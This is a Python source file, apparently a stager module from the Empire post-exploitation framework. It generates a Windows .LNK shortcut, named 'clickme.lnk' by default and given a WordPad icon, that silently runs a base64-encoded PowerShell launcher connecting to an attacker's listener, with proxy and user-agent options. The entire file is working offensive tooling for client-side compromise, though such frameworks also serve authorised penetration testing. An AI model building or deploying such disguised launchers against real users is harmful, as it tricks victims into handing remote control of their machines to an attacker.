from __future__ import print_function
from builtins import object
from empire.server.common import helpers
from empire.server.common import pylnk


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'LNKLauncher',

            'Author': ['@theguly'],

            'Description': "Create a .LNK file that launches the Empire stager.",

            'Background': False,

            'OutputExtension': None,

            'OpsecSafe': False,

            'MinPSVersion': '2',

            'Comments': [
                'http://windowsitpro.com/powershell/working-shortcuts-windows-powershell',
                'http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html',
                'https://github.com/samratashok/nishang',
                'http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-powershell-used-again-in-new-attack/',
                'lnk generation code ripped from pylnk library https://sourceforge.net/p/pylnk/home/Home/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': '',
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output.',
                'Required': True,
                'Value': 'clickme.lnk'
            },
            'PowershellPath': {
                'Description': 'Path to powershell.exe',
                'Required': True,
                'Value': 'C:\windows\system32\WindowsPowershell\\v1.0\powershell.exe'
            },
            'Icon': {
                'Description': 'Path to LNK icon.',
                'Required': False,
                'Value': 'C:\program files\windows nt\\accessories\wordpad.exe'
            },
            'LNKComment': {
                'Description': 'LNK Comment.',
                'Required': False,
                'Value': ''
            },
            'Base64': {
                'Description': 'Switch. Base64 encode the output.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = 'powershell'
        listener_name = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']
        lnk_comment = self.options['LNKComment']['Value']
        powershell_path = self.options['PowershellPath']['Value']
        lnk_name = self.options['OutFile']['Value']
        lnk_icon = self.options['Icon']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language, encode=encode,
                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                           stagerRetries=stager_retries)
        launcher = launcher.replace('powershell.exe ', '', 1)

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:
            link = pylnk.for_file(powershell_path, launcher, lnk_name, lnk_icon, lnk_comment)
            code = link.ret()

        return code
